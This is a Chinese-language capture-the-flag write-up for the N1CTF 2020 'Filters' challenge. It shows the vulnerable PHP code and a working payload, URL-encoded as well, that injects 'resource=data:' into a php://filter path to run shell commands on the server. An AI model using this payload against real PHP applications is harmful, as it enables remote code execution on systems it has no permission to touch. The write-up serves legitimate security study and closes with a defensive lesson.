# N1CTF 2020 Filters Writeup

## 题目简述

服务端接收一组 `filters` 参数，对每个值构造 `php://filter/<filter>/resource=/usr/bin/php`，读取结果后打乱顺序，拼成临时 PHP 文件并 `require`。预期思路是寻找能从 PHP 二进制产生短代码片段的过滤器，再对抗随机顺序；非预期解利用 `php://filter` 包装器语法重解释，让 `data:` 资源直接成为待包含内容。

## 解题过程

### 源码中的数据流

核心逻辑可以概括为：

```php
foreach ($_GET['filters'] as $filter) {
    $parts[] = file_get_contents(
        'php://filter/' . $filter . '/resource=/usr/bin/php'
    );
}
shuffle($parts);
file_put_contents($tmp, implode('', $parts));
require $tmp;
```

预期解需要枚举 PHP 支持的过滤器，记录每个过滤结果中可控或稳定的短字节串，再挑选若干片段，使任意或高概率排列能形成类似下面的最小代码：

```php
<?=`ls`?>
```

由于服务端会 `shuffle()`，一次请求不一定得到正确顺序，需要重复提交并以响应差异判断是否命中。

### 利用包装器语法重解释

更直接的方法是让用户提供的“过滤器名”提前结束过滤器段，并自行指定资源。传入经 URL 编码的：

```text
resource=data:,<?=`ls`?>,
```

拼接后的字符串近似为：

```text
php://filter/resource=data:,<?=`ls`?>,/resource=/usr/bin/php
```

PHP 包装器把前一个 `resource=data:` 解释为真正资源，后面的固定后缀不再按开发者预期约束输入。`file_get_contents()` 因而返回攻击者提供的 PHP 代码，临时文件被 `require` 时执行。

实际请求应对 `=`、反引号、尖括号等字符做 URL 编码，例如：

```text
filters[]=resource%3Ddata%3A%2C%3C%3F%3D%60ls%60%3F%3E%2C
```

先列目录确认 flag 文件位置，再将命令替换为读取操作即可。只有一个数组元素时，`shuffle()` 不会改变结果。

## 方法总结

本题的决定性问题是“把用户输入当成包装器语法片段”，而不是普通文件包含。遇到 `scheme://wrapper/<user>/fixed-suffix` 形式时，要检查用户输入能否重新声明 `resource`、编码链或子协议。对包装器参数应使用结构化白名单，而不是把未经语义验证的字符串夹在固定前后缀之间。
